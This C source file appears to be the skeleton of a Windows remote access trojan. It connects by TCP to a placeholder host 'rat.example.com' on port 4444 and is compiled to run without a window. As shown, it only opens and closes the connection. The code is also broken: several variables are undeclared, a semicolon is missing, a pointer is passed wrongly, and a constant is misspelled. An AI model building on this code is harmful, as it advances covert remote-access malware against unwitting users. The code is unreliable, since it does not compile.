#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char buffer[1024];
	int recv_size;

	const char* domain = "rat.example.com"; // !!!!!! change this 
	const char* port = "4444";

	WSAStartup(MAKEWORD(2, 2), *wsa); //start winsock
	hints.ai_family = AF_INET;    //IPv4
	hints.ai_socktype  = SOCK_STREAM  //tcp

	ret = getaddrinfo(domain, port, &hints, &result);
	if (ret !=0){
		WSACleanup();
		return 1;
	}

	//create socket
	s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (s == INVALID_SOCKET) {
		WSACleanup();
		return 1;
	}
	//connect
	con = connect(s, result->ai_addr, (int)result->ai_addrlen);
	if (con == SOCKEY_ERROR) {
		closesocket(s);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	closesocket(s);
	WSACleanup();
	return 0;

}
// compile: cl /O2 /SUBSYSTEM:WINDOWS yourprogram.c ws2_32.lib